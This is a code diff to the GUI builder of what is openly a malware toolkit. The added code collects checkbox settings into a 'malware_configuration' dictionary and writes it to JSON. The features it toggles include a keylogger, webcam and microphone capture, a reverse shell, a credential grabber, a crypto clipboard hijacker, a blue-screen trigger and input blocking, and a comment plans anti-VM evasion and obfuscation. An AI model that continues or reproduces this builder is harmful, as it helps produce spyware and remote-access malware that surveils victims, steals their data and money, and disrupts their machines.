@@ -90,7 +90,6 @@ class Builder:
         else:
             version_indicator = ['Couldn\'t determine latest version.', 'red', 700, 460]
 
-
         self.canvas.create_text(version_indicator[2], version_indicator[3], text=version_indicator[0], fill=version_indicator[1], font=('Consolas', 10), anchor=tk.SE)
 
 
@@ -152,8 +151,33 @@ class Builder:
             self.malware_configuration['implode_secret'] = self.implode_entry.get()
         except: pass
         try:
-            print(self.cbvar_keylogr.get())
-        except: print('eror')
+            self.malware_configuration['functionalities'] = {
+                'keylogr': self.cbvar_keylogr.get(),
+                'scrnsht': self.cbvar_scrnsht.get(),
+                #'regstry': self.cbvar_regstry.get(),
+                'f_manag': self.cbvar_fmanag.get(),
+                'grabber': self.cbvar_grabber.get(),
+                'mc_live': self.cbvar_mclive.get(),
+                'mc_recc': self.cbvar_mcrecc.get(),
+                'process': self.cbvar_process.get(),
+                'rev_shl': self.cbvar_revshl.get(),
+                'webcam_': self.cbvar_webcam.get(),
+                'scrnrec': self.cbvar_scrnrec.get(),
+                'inputbl': self.cbvar_inputbl.get(),
+                'bluesod': self.cbvar_bluesod.get(),
+                'crclipr': self.cbvar_crclipr.get(),
+                #'forkbmb': self.cbvar_forkbmb.get(),
+                'messger': self.cbvar_messger.get(),
+                'txtspee': self.cbvar_txtspee.get(),
+                'audctrl': self.cbvar_audctrl.get(),
+                'monctrl': self.cbvar_monctrl.get(),
+                'webbloc': self.cbvar_webbloc.get(),
+                'jmpscar': self.cbvar_jmpscar.get(),
+                'keystrk': self.cbvar_keystrk.get(),
+                'scrnman': self.cbvar_scrnman.get()
+            }
+            print(self.malware_configuration['functionalities'])
+        except Exception as error: print(error)
 
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
             configuration_file.write(json.dumps(self.malware_configuration))
@@ -586,7 +610,6 @@ class Builder:
         # Anti-VM   /w advanced options
         # Obfuscation
         
-
 
 
 
